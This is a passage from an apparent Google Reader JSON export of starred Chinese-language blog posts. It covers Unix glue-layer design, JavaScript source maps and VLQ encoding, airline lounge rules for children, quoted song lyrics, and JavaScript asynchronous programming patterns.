Programming</a></em>》，所以我有必要再谈谈这本书中我中毒最深的一章《模块性：保持清晰和简洁》中所谈到的胶合层。</p>\n<p>胶合层这一节中说了，我们开发软件一般要么Top-Down，要么Bottom-Up，这两种方法都有好有不好。顶层一般是应用逻辑层，底层一般是原语层（我理解为技术沉淀层，或是技术基础层）。自顶向下的开发，你可能会因为开发到底层后发现底层可沉淀的东西越来越不爽（因为被可能被很多业务逻辑所侵入），如果自底向上的开发，你可能越到上层你越发现很多你下面干的基础上工作有很多用不上（比如干多了）。所以，最好的方式是同时进行，一会顶层，一会底层，来来回回的开发——说白了就是在开发中不断的重构，边开发边理解边沉淀。</p>\n<p>无论怎么样，你会发现需要一层胶合层来胶合业务逻辑层和底层原语层（软件开发中的业务层和技术层的胶合），Unix的设计哲学认为，这层胶合层应该尽量地薄，胶合层越多，我们就只能在其中苦苦挣扎。</p>\n<p>其实，<strong>胶合层原则就是分离原则上更为上层地体现，策略（业务逻辑）和机制（基础技术或原语）的清楚的分离。你可以看到，OO和Unix都是在做这样的分离。但是需要注意到的时，OO用抽象接口来做这个分离——很多OO的模式中，抽象层太多了，导致胶合层太过于复杂了，也就是说，OO鼓励了——“厚重地胶合和复杂层次”，反而增加了程序的复杂度（这种情况在恶化中）。而Unix采用的是薄的胶合层，薄地相当的优雅</strong>。（通过这段话的描述，我相信你会明白了《<a title=\"如此理解面向对象编程\" href=\"http://coolshell.cn/articles/8745.html\" rel=\"bookmark\">如此理解面向对象编程</a>》中的个例子——为什么用OO来实现会比用非OO来实现更为地恶心——那就是因为OO胶合层太复杂了）</p>\n<p><strong>OO的最大的问题就——接口复杂度太高，胶合层太多！</strong>（注：Unix编程艺术这本书里说了软件有三个复杂度：代码量、接口、实现，这三个东西构成了我们的软件复杂度）</p>\n<h4>再送一个果盘</h4>\n<p>大家一定记得《<a title=\"SteveY对Amazon和Google平台的长篇大论 - 60,581 人阅读\" href=\"http://coolshell.cn/articles/5701.html\">SteveY对Amazon和Google平台的长篇大论</a>》中Amazon中那个令人非常向往的SOA式的架构。因为以前在Amazon，有些话不好说。现在可以说了，我在Amazon里，我个人对这个服务化的架构相当的不待见，太复杂，复杂以乱七八糟，方向是好的，想法也是好的，但是这东西和OO一样，造成大量的接口复杂度，今天的Amazon，完全没人知道各个服务是怎么个调用的，一团乱麻（其内部并不像你看到的AWS那么的美妙。注：AWS是非常不错的，是相当好的设计）。</p>\n<p><strong>那么我们怎么来解决SOA的接口复杂度问题？其实，Unix早就给出了答案——数据驱动编程</strong>（详见：《Unix编程艺术》的第9.1章），在我离开Amazon的时候，美国总部的Principle SDE们在吐槽今天Amazon的SOA架构，更好的架构应该是数据驱动式的。（今天还在Amazon的同学可以上内网boardcast上看看相关的Principle Talk视频）</p>\n<p>（瞎扯一句：这本来是我想在2012年杭州QCon上的分享的一个主题，无奈当时被大会组织者给拒了，所以只好讲了一个《建一支小团队》，今天有多人还是不能明白甚至反感我的那个《小团队》的演讲，但是我相信那是必然的趋势，就像十年前大家在说“程序员只能干到30岁”时，当时的我我却毫不犹豫地相信十年后，30岁以上的有经验的老程序员一定会成为各个公司角逐和竟争的红人）\n<div style=\"margin-top:15px;font-size:11px;color:#cc0000\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"http://coolshell.cn/\">酷壳 – CoolShell.cn</a> ，请勿用于任何商业用途）</strong></p></div>\n<div style=\"text-align:center;padding:0px;font-size:14px;margin-bottom:50px\">——=== <b>访问 <a href=\"http://coolshell.cn/404/\">酷壳404页面</a> 以支持公益事业</b> ===——</div>\n\n<div><div><h3>相关文章</h3><ul><li>2012年05月03日 -- <a href=\"http://coolshell.cn/articles/7236.html\">用Unix的设计思想来应对多变的需求</a></li><li>2012年03月26日 -- <a href=\"http://coolshell.cn/articles/6950.html\">需求变化与IoC</a></li><li>2011年04月25日 -- <a href=\"http://coolshell.cn/articles/4535.html\">一些软件设计的原则</a></li><li>2012年12月13日 -- <a href=\"http://coolshell.cn/articles/8745.html\">如此理解面向对象编程</a></li><li>2012年08月01日 -- <a href=\"http://coolshell.cn/articles/7965.html\">一个fork的面试题</a></li><li>2012年07月11日 -- <a href=\"http://coolshell.cn/articles/7829.html\">28个Unix/Linux的命令行神器</a></li><li>2012年11月23日 -- <a href=\"http://coolshell.cn/articles/8619.html\">你可能不知道的Shell</a></li><li>2012年08月16日 -- <a href=\"http://coolshell.cn/articles/8088.html\">对技术的态度</a></li></ul><div><a href=\"http://www.zemanta.com/?wp-related-posts\">Zemanta</a></div></div></div></p>"
    },
    "author" : "陈皓",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://coolshell.cn/feed",
      "title" : "酷壳 - CoolShell.cn",
      "htmlUrl" : "http://coolshell.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1358925644464",
    "timestampUsec" : "1358925644464583",
    "id" : "tag:google.com,2005:reader/item/9bd2d57d366bf35c",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "JavaScript" ],
    "title" : "JavaScript Source Map 详解",
    "published" : 1358922638,
    "updated" : 1358922638,
    "alternate" : [ {
      "href" : "http://www.ruanyifeng.com/blog/2013/01/javascript_source_map.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p>上周，<a href=\"http://blog.jquery.com/2013/01/15/jquery-1-9-final-jquery-2-0-beta-migrate-final-released/\">jQuery 1.9</a>发布。</p><p><img src=\"http://image.beekka.com/blog/201301/bg2013012203.png\"></p>\n\n<p>这是2.0版之前的最后一个新版本，有很多新功能，其中一个就是支持Source Map。</p>\n\n<p>访问 <a href=\"http://ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js\">http://ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js</a>，打开压缩后的版本，滚动到底部，你可以看到最后一行是这样的：</p>\n\n<blockquote>\n\n<p>　　//@ sourceMappingURL=jquery.min.map</p>\n\n</blockquote>\n\n<p>这就是Source Map。它是一个独立的map文件，与源码在同一个目录下，你可以<a href=\"http://ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.map\">点击进去</a>，看看它的样子。</p>\n\n<p>这是一个很有用的功能，本文将详细讲解这个功能。</p>\n\n<p><strong>一、从源码转换讲起</strong></p>\n\n<p>JavaScript脚本正变得越来越复杂。大部分源码（尤其是各种函数库和框架）都要经过转换，才能投入生产环境。</p>\n\n<p>常见的源码转换，主要是以下三种情况：</p>\n\n<blockquote>\n\n<p>　　（1）压缩，减小体积。比如jQuery 1.9的源码，压缩前是252KB，压缩后是32KB。</p>\n\n<p>　　（2）多个文件合并，减少HTTP请求数。</p>\n\n<p>　　（3）其他语言编译成JavaScript。最常见的例子就是CoffeeScript。</p>\n\n</blockquote>\n\n<p>这三种情况，都使得实际运行的代码不同于开发代码，除错（debug）变得困难重重。</p>\n\n<p>通常，JavaScript的解释器会告诉你，第几行第几列代码出错。但是，这对于转换后的代码毫无用处。举例来说，jQuery 1.9压缩后只有3行，每行3万个字符，所有内部变量都改了名字。你看着报错信息，感到毫无头绪，根本不知道它所对应的原始位置。</p>\n\n<p>这就是Source map想要解决的问题。</p>\n\n<p><strong>二、什么是Source map</strong></p>\n\n<p>简单说，Source map就是一个信息文件，里面储存着位置信息。也就是说，转换后的代码的每一个位置，所对应的转换前的位置。</p>\n\n<p>有了它，出错的时候，除错工具将直接显示原始代码，而不是转换后的代码。这无疑给开发者带来了很大方便。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201301/bg2013012204.png\"></p>\n\n<p>目前，暂时只有Chrome浏览器支持这个功能。在Developer Tools的Setting设置中，确认选中\"Enable source maps\"。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201301/bg2013012201.png\"></p>\n\n<p><strong>三、如何启用Source map</strong></p>\n\n<p>正如前文所提到的，只要在转换后的代码尾部，加上一行就可以了。</p>\n\n<blockquote>\n\n<p>　　//@ sourceMappingURL=/path/to/file.js.map</p>\n\n</blockquote>\n\n<p>map文件可以放在网络上，也可以放在本地文件系统。</p>\n\n<p><strong>四、如何生成Source map</strong></p>\n\n<p>最常用的方法是使用Google的<a href=\"https://developers.google.com/closure/compiler/\">Closure编译器</a>。</p>\n\n<p>生成命令的格式如下：</p>\n\n<blockquote>\n\n<p>　　java -jar compiler.jar \\ <br>\n　　　　--js script.js \\<br>\n　　　　--create_source_map ./script-min.js.map \\<br>\n　　　　--source_map_format=V3 \\<br>\n　　　　--js_output_file script-min.js</p>\n\n</blockquote>\n\n<p>各个参数的意义如下：</p>\n\n<blockquote>\n\n<p>　　- js： 转换前的代码文件<br>\n　　- create_source_map： 生成的source map文件<br>\n　　- source_map_format：source map的版本，目前一律采用V3。<br>\n　　- js_output_file： 转换后的代码文件。</p>\n\n</blockquote>\n\n<p>其他的生成方法可以参考<a href=\"http://net.tutsplus.com/tutorials/tools-and-tips/source-maps-101/\">这篇文章</a>。</p>\n\n<p><strong>五、Source map的格式</strong></p>\n\n<p>打开Source map文件，它大概是这个样子：</p>\n\n<blockquote>\n\n<p>　　{<br>\n　　　　version : 3,<br>\n　　　　file: \"out.js\",<br>\n　　　　sourceRoot : \"\",<br>\n　　　　sources: [\"foo.js\", \"bar.js\"],<br>\n　　　　names: [\"src\", \"maps\", \"are\", \"fun\"],<br>\n　　　　mappings: \"AAgBC,SAAQ,CAAEA\"<br>\n　　}</p>\n\n</blockquote>\n\n<p>整个文件就是一个JavaScript对象，可以被解释器读取。它主要有以下几个属性：</p>\n\n<blockquote>\n\n<p>　　- version：Source map的版本，目前为3。</p>\n\n<p>　　- file：转换后的文件名。</p>\n\n<p>　　- sourceRoot：转换前的文件所在的目录。如果与转换前的文件在同一目录，该项为空。</p>\n\n<p>　　- sources：转换前的文件。该项是一个数组，表示可能存在多个文件合并。</p>\n\n<p>　　- names：转换前的所有变量名和属性名。</p>\n\n<p>　　- mappings：记录位置信息的字符串，下文详细介绍。</p>\n\n</blockquote>\n\n<p><strong>六、mappings属性</strong></p>\n\n<p>下面才是真正有趣的部分：两个文件的各个位置是如何一一对应的。</p>\n\n<p>关键就是map文件的mappings属性。这是一个很长的字符串，它分成三层。</p>\n\n<blockquote>\n\n<p>　　第一层是<strong>行对应</strong>，以分号（;）表示，每个分号对应转换后源码的一行。所以，第一个分号前的内容，就对应源码的第一行，以此类推。</p>\n\n<p>　　第二层是<strong>位置对应</strong>，以逗号（,）表示，每个逗号对应转换后源码的一个位置。所以，第一个逗号前的内容，就对应该行源码的第一个位置，以此类推。</p>\n\n<p>　　第三层是<strong>位置转换</strong>，以<a href=\"http://en.wikipedia.org/wiki/Variable-length_quantity\">VLQ编码</a>表示，代表该位置对应的转换前的源码位置。</p>\n\n</blockquote>\n\n<p>举例来说，假定mappings属性的内容如下：</p>\n\n<blockquote>\n\n<p>　　mappings:\"AAAAA,BBBBB;CCCCC\"</p>\n\n</blockquote>\n\n<p>就表示，转换后的源码分成两行，第一行有两个位置，第二行有一个位置。</p>\n\n<p><strong>七、位置对应的原理</strong></p>\n\n<p>每个位置使用五位，表示五个字段。</p>\n\n<p>从左边算起，</p>\n\n<blockquote>\n\n<p>　　- 第一位，表示这个位置在（转换后的代码的）的第几列。</p>\n\n<p>　　- 第二位，表示这个位置属于sources属性中的哪一个文件。</p>\n\n<p>　　- 第三位，表示这个位置属于转换前代码的第几行。</p>\n\n<p>　　- 第四位，表示这个位置属于转换前代码的第几列。</p>\n\n<p>　　- 第五位，表示这个位置属于names属性中的哪一个变量。</p>\n\n</blockquote>\n\n<p>有几点需要说明。首先，所有的值都是以0作为基数的。其次，第五位不是必需的，如果该位置没有对应names属性中的变量，可以省略第五位。再次，每一位都采用VLQ编码表示；由于VLQ编码是变长的，所以每一位可以由多个字符构成。</p>\n\n<p>如果某个位置是AAAAA，由于A在VLQ编码中表示0，因此这个位置的五个位实际上都是0。它的意思是，该位置在转换后代码的第0列，对应sources属性中第0个文件，属于转换前代码的第0行第0列，对应names属性中的第0个变量。</p>\n\n<p><strong>八、VLQ编码</strong></p>\n\n<p>最后，谈谈如何用<a href=\"http://en.wikipedia.org/wiki/Variable-length_quantity\">VLQ编码</a>表示数值。</p>\n\n<p>这种编码最早用于MIDI文件，后来被多种格式采用。它的特点就是可以非常精简地表示很大的数值。</p>\n\n<p>VLQ编码是变长的。如果（整）数值在-15到+15之间（含两个端点），用一个字符表示；超出这个范围，就需要用多个字符表示。它规定，每个字符使用6个两进制位，正好可以借用<a href=\"http://en.wikipedia.org/wiki/Base_64\">Base 64</a>编码的字符表。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201301/bg2013012202.png\"></p>\n\n<p>在这6个位中，左边的第一位（最高位）表示是否\"连续\"（continuation）。如果是1，代表这６个位后面的6个位也属于同一个数；如果是0，表示该数值到这6个位结束。</p>\n\n<blockquote>\n\n<p>　　Continuation<br>\n　　|　　　　　Sign<br>\n　　|　　　　　|<br>\n　　V　　　　　V<br>\n　　１０１０１１</p>\n\n</blockquote>\n\n<p>这6个位中的右边最后一位（最低位）的含义，取决于这6个位是否是某个数值的VLQ编码的第一个字符。如果是的，这个位代表\"符号\"（sign），0为正，1为负（Source map的符号固定为0）；如果不是，这个位没有特殊含义，被算作数值的一部分。</p>\n\n<p><strong>九、VLQ编码：实例</strong></p>\n\n<p>下面看一个例子，如何对数值16进行VLQ编码。</p>\n\n<blockquote>\n\n<p>　　第一步，将16改写成二进制形式10000。</p>\n\n<p>　　第二步，在最右边补充符号位。因为16大于0，所以符号位为0，整个数变成100000。</p>\n\n<p>　　第三步，从右边的最低位开始，将整个数每隔5位，进行分段，即变成1和00000两段。如果最高位所在的段不足5位，则前面补0，因此两段变成00001和00000。</p>\n\n<p>　　第四步，将两段的顺序倒过来，即00000和00001。</p>\n\n<p>　　第五步，在每一段的最前面添加一个\"连续位\"，除了最后一段为0，其他都为1，即变成100000和000001。</p>\n\n<p>　　第六步，将每一段转成Base 64编码。</p>\n\n</blockquote>\n\n<p>查表可知，100000为g，000001为B。因此，数值16的VLQ编码为gB。上面的过程，看上去好像很复杂，做起来其实很简单，具体的实现请看官方的<a href=\"https://github.com/mozilla/source-map/blob/master/lib/source-map/base64-vlq.js\">base64-vlq.js</a>文件，里面有详细的注释。</p>\n\n<p><strong>十、参考链接</strong></p>\n\n<p>　　- <a href=\"http://www.html5rocks.com/en/tutorials/developertools/sourcemaps/\">Introduction To JavaScript Source Maps</a><br>\n　　- <a href=\"https://docs.google.com/document/d/1U1RGAehQwRypUTovF1KRlpiOFze0b-_2gc6fAH0KY0k/edit\">Source Map Revision 3 Proposal</a></p>\n\n<p>（完）</p><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;border:1px solid #d3d3d3;margin:1em;background-color:#aad2f0;border-radius:10px\"><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名 | <a href=\"http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh\">Creative Commons BY-NC-ND 3.0</a></li>\n<li>原文网址：<a href=\"http://www.ruanyifeng.com/blog/2013/01/javascript_source_map.html\">http://www.ruanyifeng.com/blog/2013/01/javascript_source_map.html</a></li>\n<li>最后修改时间：2013年3月19日 16:10</li>\n<li>付费支持：<a href=\"https://me.alipay.com/ruanyf\"><img src=\"http://www.ruanyifeng.com/blog/images/rmb_32.png\" title=\"人民币\" alt=\"人民币 - 支付宝\" style=\"border:none;vertical-align:middle\"></a> | <a href=\"https://www.paypal.com/cgi-bin/webscr?cmd=_xclick&amp;business=yifeng.ruan@gmail.com&amp;currency_code=USD&amp;amount=0.99&amp;return=http://www.ruanyifeng.com/thank.html&amp;item_name=Ruan%20YiFeng&#39;s%20Blog&amp;undefined_quantity=1&amp;no_note=0\"><img src=\"http://www.ruanyifeng.com/blog/images/dollar_32.png\" alt=\"美元 - paypal\" title=\"美元\" style=\"border:none;vertical-align:middle\"></a> </li>\n</ul></div><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;margin:1em;border-radius:10px\"><p><strong>[广告]</strong>　<a href=\"http://ushan.cn?utm_source=ruanyifeng.com\" style=\"border:none\">优衫（Ushan）是国内顶尖的定制西服店，常年为众多政商名流、影视明星、跨国高管定制衬衫与西服。以工艺精良、用料考究、版型出色、性价比高等特点广受各界好评。</a>\n</p>\n</div>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/ruanyifeng",
      "title" : "阮一峰的网络日志",
      "htmlUrl" : "http://www.ruanyifeng.com/blog/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1358105386897",
    "timestampUsec" : "1358105386897469",
    "id" : "tag:google.com,2005:reader/item/e371c637c46c08a4",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "三个人的旅行", "我的慵懒生活", "fly", "travel" ],
    "title" : "从一件小事儿看北美-日本-中国三地关于严格执行制度和人性化的一些区别",
    "published" : 1358101533,
    "updated" : 1358101533,
    "alternate" : [ {
      "href" : "http://b.gkp.cc/2013/01/14/different-rule-enforcement-style-na-jp-cn/",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>这篇 blog 的内容源于最近的带 lisa 和豆干儿一起出行的经历，我觉得有些意思，在此记录一下。</p>\n<p>首先是背景，我和 lisa 带着三岁的豆干儿从 JFK 经 NRT 回 PEK，返程是 PEK-HND-NRT-JFK，全程 NH 出票，NH 承运。按照<a href=\"http://www.staralliance.com/en/benefits/lounges/lounge-access-policy/\">星盟官网公布的规定</a>，我可以免费带一名同行人员进入星盟成员休息厅，也就是说严格按照规定的话我是无法同时带 lisa 和豆干儿使用休息厅的。</p>\n<p>接下来是我们分别在三个机场的情况：</p>\n<p>JFK：NH 在 JFK T7 没有自己的值机柜台，由 BA 的地服完成这项工作。在值机完成后，地服单独用登机牌纸打印了三张 lounge invitation 给我，告诉我需要凭这个进入 BA 的 lounge（因为 BA 并不是星盟成员）。到楼上后发现 NH 在 JFK 和 BA 共用运营 lounge（再次，这个组合真的很奇怪），把 lounge invitation 给 NH 接待后就可以进入了。（其实我到值机之前一直以为要用隔壁的 United Club，不过 BA lounge 确实比 UC 要好。）</p>\n<p>NRT：NRT 出发是早上，虽然我在 JFK 就已经拿到了这段儿的登机牌，但是由于 JFK 地服的失误我还是先去了 NH 的值机柜台修改信息。地服态度非常好，但是最后委婉的跟我说“我看您一共有三口人，但是只有两个人可以进入我们的 lounge 哦。。。 ”。我们的登机口在50附近，正好在 NH lounge 的下方，于是我抱着试试看的态度去挑战了一下 lounge dragon：<br>\n<em>“你看我们带着孩子，一会儿从这里出发，能进去吗？”</em><br>\n<em>“不好意思，您只能邀请另外一名旅客进入，超过俩岁的儿童都要单独计算的”</em><br>\n<em>“他才三岁呀，通融通融嘛”</em><br>\n<em>“真的不好意思，我们也很想通融，但是我们不能违反规定，如果您想带宝宝一起进入 lounge 的话，可以用 5000 日元购买一张 one time pass。”</em><br>\n<em>“。。。那还是算了吧，拜拜”</em></p>\n<p>好在 NRT 还有 United Club， 过去后在门口的遭遇几乎和 NH 那边一模一样，死脑筋的日本人死咬着2岁以上单独计算这条规定，最后还是用了一张 one time pass 才放行我们。</p>\n<p>最后是昨天从 PEK 出发，地服来自 CA，所有手续完毕后地服给了我 CA lounge 的位置，在被我问到豆干儿的问题后地服的回答是：“12岁以下一般都没有问题的”。实际情况也却是是这样，休息厅接待只扫描了一下我和 lisa 的登机牌，什么额外的话都没说。</p>\n<p>流水账完毕，经过三种完全不同的遭遇后，我 Google 了一下，发现大家的经历基本上也和我一样：</p>\n<p>北美：只要是同一家庭的随行儿童，岁数别太大，没有数量限制，都可以跟着父母使用休息厅。<br>\n日本：严格执行制度，完全没可能免费带2岁以上的儿童进入。<br>\n天朝：没有找到类似的报告。</p>\n<p>所以看起来，北美对制度的执行很人性化，尤其对家庭很看重。日本则完全是另外一个极端，有白纸黑字的制度就完全没有任何例外。而天朝貌似是有一套自己的规定。</p>\n<p>由小见大。</p>"
    },
    "author" : "gkp",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://b.gkp.cc/feed/",
      "title" : "gkp&#39;s post",
      "htmlUrl" : "http://b.gkp.cc"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1357052492094",
    "timestampUsec" : "1357052492094601",
    "id" : "tag:google.com,2005:reader/item/a84133e9aecc0e58",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "Shared Chaos" ],
    "title" : "新年",
    "published" : 1357027199,
    "updated" : 1357026742,
    "alternate" : [ {
      "href" : "https://blog.delphij.net/2012/12/post-629.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>正好聽到這首 \"Somewhere Only We Know\"：</p>\n\n<p>I walked across an empty land<br>\nI knew the pathway like the back of my hand<br>\nI felt the earth beneath my feet<br>\nSat by the river and it made me complete</p>\n\n<p>Oh simple thing where have you gone?<br>\nI'm getting old and I need something to rely on<br>\nSo tell me when you're gonna let me in<br>\nI'm getting tired and I need somewhere to begin</p>\n\n<p>I came across a fallen tree<br>\nI felt the branches of it looking at me<br>\nIs this the place we used to love?<br>\nIs this the place that I've been dreaming of?</p>\n\n<p>Oh simple thing where have you gone?<br>\nI'm getting old and I need something to rely on<br>\nSo tell me when you're gonna let me in<br>\nI'm getting tired and I need somewhere to begin</p>\n\n<p>And if you have a minute why don't we go<br>\nTalk about it somewhere only we know?<br>\nThis could be the end of everything<br>\nSo why don't we go<br>\nSomewhere only we know?<br>\nSomewhere only we know?</p>\n\n<p>Oh simple thing where have you gone?<br>\nI'm getting old and I need something to rely on<br>\nSo tell me when you're gonna let me in<br>\nI'm getting tired and I need somewhere to begin</p>\n\n<p>And if you have a minute why don't we go<br>\nTalk about it somewhere only we know?<br>\nThis could be the end of everything<br>\nSo why don't we go?<br>\nSo why don't we go?</p>\n\n<p>Ah-ah-ah<br>\nAh-ah-ah</p>\n\n<p>This could be the end of everything<br>\nSo why don't we go<br>\nSomewhere only we know?<br>\nSomewhere only we know?<br>\nSomewhere only we know?</p>"
    },
    "author" : "Xin LI",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/https://blog.delphij.net/atom.xml",
      "title" : "delphij&#39;s Chaos",
      "htmlUrl" : "https://blog.delphij.net/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1356081114584",
    "timestampUsec" : "1356081114584348",
    "id" : "tag:google.com,2005:reader/item/96df21b7469dcdb2",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "JavaScript" ],
    "title" : "Javascript异步编程的4种方法",
    "published" : 1356078454,
    "updated" : 1356078454,
    "alternate" : [ {
      "href" : "http://www.ruanyifeng.com/blog/2012/12/asynchronous%EF%BC%BFjavascript.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p>你可能知道，Javascript语言的执行环境是\"单线程\"（single thread）。</p><p>所谓\"单线程\"，就是指一次只能完成一件任务。如果有多个任务，就必须排队，前面一个任务完成，再执行后面一个任务，以此类推。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201212/bg2012122101.jpg\"></p>\n\n<p>这种模式的好处是实现起来比较简单，执行环境相对单纯；坏处是只要有一个任务耗时很长，后面的任务都必须排队等着，会拖延整个程序的执行。常见的浏览器无响应（假死），往往就是因为某一段Javascript代码长时间运行（比如死循环），导致整个页面卡在这个地方，其他任务无法执行。</p>\n\n<p>为了解决这个问题，Javascript语言将任务的执行模式分成两种：同步（Synchronous）和异步（Asynchronous）。</p>\n\n<p>\"同步模式\"就是上一段的模式，后一个任务等待前一个任务结束，然后再执行，程序的执行顺序与任务的排列顺序是一致的、同步的；\"异步模式\"则完全不同，每一个任务有一个或多个回调函数（callback），前一个任务结束后，不是执行后一个任务，而是执行回调函数，后一个任务则是不等前一个任务结束就执行，所以程序的执行顺序与任务的排列顺序是不一致的、异步的。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201212/bg2012122102.png\" style=\"border:none\"></p>\n\n<p>\"异步模式\"非常重要。在浏览器端，耗时很长的操作都应该异步执行，避免浏览器失去响应，最好的例子就是Ajax操作。在服务器端，\"异步模式\"甚至是唯一的模式，因为执行环境是单线程的，如果允许同步执行所有http请求，服务器性能会急剧下降，很快就会失去响应。</p>\n\n<p>本文总结了\"异步模式\"编程的4种方法，理解它们可以让你写出结构更合理、性能更出色、维护更方便的Javascript程序。</p>\n\n<p><strong>一、回调函数</strong></p>\n\n<p>这是异步编程最基本的方法。</p>\n\n<p>假定有两个函数f1和f2，后者等待前者的执行结果。</p>\n\n<blockquote>\n\n<p>　　f1();</p>\n\n<p>　　f2();</p>\n\n</blockquote>\n\n<p>如果f1是一个很耗时的任务，可以考虑改写f1，把f2写成f1的回调函数。</p>\n\n<blockquote>\n\n<p>　　function f1(callback){</p>\n\n<p>　　　　setTimeout(function () {</p>\n\n<p>　　　　　　// f1的任务代码</p>\n\n<p>　　　　　　callback();</p>\n\n<p>　　　　}, 1000);</p>\n\n<p>　　}</p>\n\n</blockquote>\n\n<p>执行代码就变成下面这样：</p>\n\n<blockquote>\n\n<p>　　f1(f2);</p>\n\n</blockquote>\n\n<p>采用这种方式，我们把同步操作变成了异步操作，f1不会堵塞程序运行，相当于先执行程序的主要逻辑，将耗时的操作推迟执行。</p>\n\n<p>回调函数的优点是简单、容易理解和部署，缺点是不利于代码的阅读和维护，各个部分之间高度<a href=\"http://en.wikipedia.org/wiki/Coupling_(computer_programming)\">耦合</a>（Coupling），流程会很混乱，而且每个任务只能指定一个回调函数。</p>\n\n<p><strong>二、事件监听</strong></p>\n\n<p>另一种思路是采用事件驱动模式。任务的执行不取决于代码的顺序，而取决于某个事件是否发生。</p>\n\n<p>还是以f1和f2为例。首先，为f1绑定一个事件（这里采用的jQuery的<a href=\"http://api.jquery.com/on/\">写法</a>）。</p>\n\n<blockquote>\n\n<p>　　f1.on('done', f2);</p>\n\n</blockquote>\n\n<p>上面这行代码的意思是，当f1发生done事件，就执行f2。然后，对f1进行改写：</p>\n\n<blockquote>\n\n<p>　　function f1(){</p>\n\n<p>　　　　setTimeout(function () {</p>\n\n<p>　　　　　　// f1的任务代码</p>\n\n<p>　　　　　　<strong>f1.trigger('done');</strong></p>\n\n<p>　　　　}, 1000);</p>\n\n<p>　　}</p>\n\n</blockquote>\n\n<p>f1.trigger('done')表示，执行完成后，立即触发done事件，从而开始执行f2。</p>\n\n<p>这种方法的优点是比较容易理解，可以绑定多个事件，每个事件可以指定多个回调函数，而且可以<a href=\"http://en.wikipedia.org/wiki/Decoupling\">\"去耦合\"</a>（Decoupling），有利于实现<a href=\"http://www.ruanyifeng.com/blog/2012/10/javascript_module.html\">模块化</a>。缺点是整个程序都要变成事件驱动型，运行流程会变得很不清晰。</p>\n\n<p><strong>三、发布/订阅</strong></p>\n\n<p>上一节的\"事件\"，完全可以理解成\"信号\"。</p>\n\n<p>我们假定，存在一个\"信号中心\"，某个任务执行完成，就向信号中心\"发布\"（publish）一个信号，其他任务可以向信号中心\"订阅\"（subscribe）这个信号，从而知道什么时候自己可以开始执行。这就叫做<a href=\"http://en.wikipedia.org/wiki/Publish-subscribe_pattern\">\"发布/订阅模式\"</a>（publish-subscribe pattern），又称<a href=\"http://en.wikipedia.org/wiki/Observer_pattern\">\"观察者模式\"</a>（observer pattern）。</p>\n\n<p>这个模式有多种<a href=\"http://msdn.microsoft.com/en-us/magazine/hh201955.aspx\">实现</a>，下面采用的是Ben Alman的<a href=\"https://gist.github.com/661855\">Tiny Pub/Sub</a>，这是jQuery的一个插件。</p>\n\n<p>首先，f2向\"信号中心\"jQuery订阅\"done\"信号。</p>\n\n<blockquote>\n\n<p>　　jQuery.subscribe(\"done\", f2);</p>\n\n</blockquote>\n\n<p>然后，f1进行如下改写：</p>\n\n<blockquote>\n\n<p>　　function f1(){</p>\n\n<p>　　　　setTimeout(function () {</p>\n\n<p>　　　　　　// f1的任务代码</p>\n\n<p>　　　　　　<strong>jQuery.publish(\"done\");</strong></p>\n\n<p>　　　　}, 1000);</p>\n\n<p>　　}</p>\n\n</blockquote>\n\n<p>jQuery.publish(\"done\")的意思是，f1执行完成后，向\"信号中心\"jQuery发布\"done\"信号，从而引发f2的执行。</p>\n\n<p>此外，f2完成执行后，也可以取消订阅（unsubscribe）。</p>\n\n<blockquote>\n\n<p>　　jQuery.unsubscribe(\"done\", f2);</p>\n\n</blockquote>\n\n<p>这种方法的性质与\"事件监听\"类似，但是明显优于后者。因为我们可以通过查看\"消息中心\"，了解存在多少信号、每个信号有多少订阅者，从而监控程序的运行。</p>\n\n<p><strong>四、Promises对象</strong></p>\n\n<p>Promises对象是CommonJS工作组提出的一种规范，目的是为异步编程提供<a href=\"http://wiki.commonjs.org/wiki/Promises/A\">统一接口</a>。</p>\n\n<p>简单说，它的思想是，每一个异步任务返回一个Promise对象，该对象有一个then方法，允许指定回调函数。比如，f1的回调函数f2,可以写成：</p>\n\n<blockquote>\n\n<p>　　f1().then(f2);</p>\n\n</blockquote>\n\n<p>f1要进行如下改写（这里使用的是jQuery的<a href=\"http://www.ruanyifeng.com/blog/2011/08/a_detailed_explanation_of_jquery_deferred_object.html\">实现</a>）：</p>\n\n<blockquote>\n\n<p>　　function f1(){</p>\n\n<p>　　　　var dfd = $.Deferred();</p>\n\n<p>　　　　setTimeout(function () {</p>\n\n<p>　　　　　　// f1的任务代码</p>\n\n<p>　　　　　　dfd.resolve();</p>\n\n<p>　　　　}, 